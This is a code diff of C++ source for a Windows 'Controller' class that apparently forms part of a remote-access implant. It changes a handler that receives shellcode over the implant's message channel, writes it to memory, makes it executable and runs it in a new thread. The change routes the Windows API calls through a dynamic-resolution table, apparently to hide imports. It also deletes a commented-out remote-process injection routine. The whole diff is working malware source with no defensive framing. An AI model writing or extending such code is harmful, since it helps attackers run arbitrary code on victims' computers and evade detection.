@@ -16,6 +16,15 @@ Controller::Controller(
 {
 }
 
+Controller::Controller(
+    MessageHandler* messageHandler, 
+    ApiManager* apiManager)
+    :
+    messageHandler_(messageHandler),
+    apiManager_(apiManager)
+{
+}
+
 void Controller::handleDefault(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleDefault()" << std::endl;
@@ -63,21 +72,30 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 
 	MessageHeader header;
 	header.messageType_ = MessageType::COMMAND_RESULT;
-	header.messageId_ = 105; // TODO: 
+	header.messageId_ = 105; // TODO: use input messageId?
 	header.dataSize_ = outMsg.data_.size();
 	outMsg.header_ = header;
 
 	messageHandler_->sendMessage(outMsg);
 }
 
+// TODO: figure out why this crashes the program
 void Controller::handleExecuteShellcode(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
+    
+    typedef LPVOID(WINAPI* FuncVirtualAlloc)
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)apiManager_->fProcedures_["VirtualAlloc"];
 
-	LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	//LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	LPVOID shellMem = pVirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
+		std::cout << "VirtualAlloc failed" << std::endl;
 		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
+        return;
 	}
 
 	// memcpy(beacon_mem, shellcode, bytes_received);
@@ -87,74 +105,56 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 		((char*)shellMem)[i] = msg.data_[i];
 	}
 
+    typedef BOOL(WINAPI* FuncVirtualProtect)
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)apiManager_->fProcedures_["VirtualProtect"];
+
 	// EXECUTE_READ.
 	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
 	// NOTE: virtualProtect is also being called somewhere in the windows api
-	if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	if (pVirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	//if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
 	{
+		std::cout << "VirtualProtect failed" << std::endl;
 		// Fail silently if we cannot make the memory executable.
+        return;
 	}
 
 	// DEBUG_PRINT("6 - Memory allocated and copied");
 
+    typedef HANDLE(WINAPI* FuncCreateThread)
+	(LPSECURITY_ATTRIBUTES lpThreadAttributes, 
+     SIZE_T dwStackSize,
+     LPTHREAD_START_ROUTINE lpStartAddress, 
+     LPVOID lpParameter, 
+     DWORD dwCreationFlags, 
+     LPDWORD lpThreadId);
+
+    FuncCreateThread pCreateThread = (FuncCreateThread)apiManager_->fProcedures_["CreateThread"];
+
 	// 4.
 	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
-	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
 	if (!thread)
 	{
+		std::cout << "CreateThread failed" << std::endl;
 		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
+        return;
 	}
+
+    typedef DWORD(WINAPI* FuncWaitForSingleObject)
+	(HANDLE hHandle, DWORD dwMilliseconds);
+
+    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)apiManager_->fProcedures_["WaitForSingleObject"];
 
 	// DEBUG_PRINT("7 - Thread created, waiting..."); 
-	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	//WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+
+    // TODO: virtual free?
 
 }
-
-/* NOTE: creating seperate process entirely
-bool Controller::handleExecuteShellcode(const InternalMessage& msg)
-{
-	std::cout << "executeShellcode in separate process" << std::endl;
-
-	// Create a temporary process to host the shellcode
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi;
-
-	wchar_t cmdline[] = L"cmd.exe /c timeout 1 > nul";  // Dummy process
-
-	if (CreateProcess(NULL, cmdline, NULL, NULL, FALSE,
-		CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-	{
-		// Allocate memory in the remote process
-		LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, msg.header.dataSize,
-			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-		if (remoteMem)
-		{
-			// Write shellcode to remote process
-			WriteProcessMemory(pi.hProcess, remoteMem, msg.data.data(), msg.header.dataSize, NULL);
-
-			// Create remote thread to execute shellcode
-			HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
-				(LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
-			if (remoteThread)
-			{
-				// Wait for shellcode to complete (with timeout)
-				WaitForSingleObject(remoteThread, 10000);
-				CloseHandle(remoteThread);
-			}
-		}
-
-		// Clean up the temporary process
-		TerminateProcess(pi.hProcess, 0);
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-
-		std::cout << "Shellcode executed in separate process" << std::endl;
-		return true;
-	}
-
-	std::cout << "Failed to create separate process" << std::endl;
-	return false;
-}*/
 
 void Controller::handleSystemInfo(const InternalMessage& msg)
 {
@@ -174,10 +174,13 @@ void Controller::handleSystemInfo(const InternalMessage& msg)
     //}
     ///
     typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    //HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hMod = apiManager_->hModules_[L"ntdll.dll"];
     if (hMod)
     {
-        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+        // TODO: use apiManager for this
+        //RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)apiManager_->fProcedures_["RtlGetVersion"];
         if (fxPtr != nullptr)
         {
             RTL_OSVERSIONINFOW rovi = { 0 };
@@ -247,10 +250,11 @@ void Controller::handleSystemInfo(const InternalMessage& msg)
 
     MessageHeader header;
     header.messageType_ = MessageType::COMMAND_RESULT;
-    header.messageId_ = 105; // TODO:
+    header.messageId_ = 99; // TODO:
     header.dataSize_ = outMsg.data_.size();
     outMsg.header_ = header;
 
 	messageHandler_->sendMessage(outMsg);
+
 }
 
